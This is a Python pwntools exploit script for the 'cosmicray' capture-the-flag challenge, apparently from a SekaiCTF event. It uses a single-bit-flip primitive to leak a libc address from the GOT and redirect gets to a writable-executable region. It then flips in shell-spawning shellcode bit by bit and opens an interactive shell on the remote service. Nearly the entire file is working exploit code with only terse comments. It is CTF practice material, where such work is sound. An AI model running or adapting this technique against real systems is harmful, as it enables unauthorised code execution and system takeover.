#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host chals.sekai.team --port 4077 dist/cosmicray
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'cosmicray_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chals.sekai.team'
port = int(args.PORT or 4077)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x4016DD
continue
'''.format(**locals())

io = start()

io.sendlineafter(b"it:", b"0x401641") # address of the je in cosmicray
io.sendlineafter(b"):", b"1")

values = []

# leak addr
for _ in range(8):
    io.sendlineafter(b"it:", hex(0x404030+_).encode())
    io.sendlineafter(b"):", b"7")
    io.recvuntil(b"New value is ")
    value = (int(io.recvline()) & 0xff) ^ 1
    values.append(value)

libc = ELF("libc-2.35.so")

libc.address = u64(bytes(values)) - libc.sym.setbuf
info("Got libc address as 0x%x", libc.address)

shellcode_addr = 0x401710 # unused, but rx
target = shellcode_addr
current = exe.plt.gets ^ 0x164

to_flip = bin(target ^ current)[2:].rjust(64, '0')

# rewrite the address of gets to our code
for i,c in enumerate(to_flip):
    if c == "1":
        io.sendlineafter(b"it:", hex(0x404060+(7-i//8)).encode())
        io.sendlineafter(b"):", str(i % 8).encode())

# start writing shellcode
sc = asm(shellcraft.sh())
bits = "".join([bin(i)[2:].rjust(8,'0') for i in sc])
with log.progress("Flipping bits") as p:
    for i,c in enumerate(bits):
        p.status(f"{i} / {len(bits)}")
        if c == "1":
            io.sendlineafter(b"it:", hex(shellcode_addr + i//8).encode())
            io.sendlineafter(b"):", str(i % 8).encode())
    p.success()

# undo redirection
io.sendlineafter(b"it:", b"0x401641") # address of the je in cosmicray
io.sendlineafter(b"):", b"1")

io.interactive()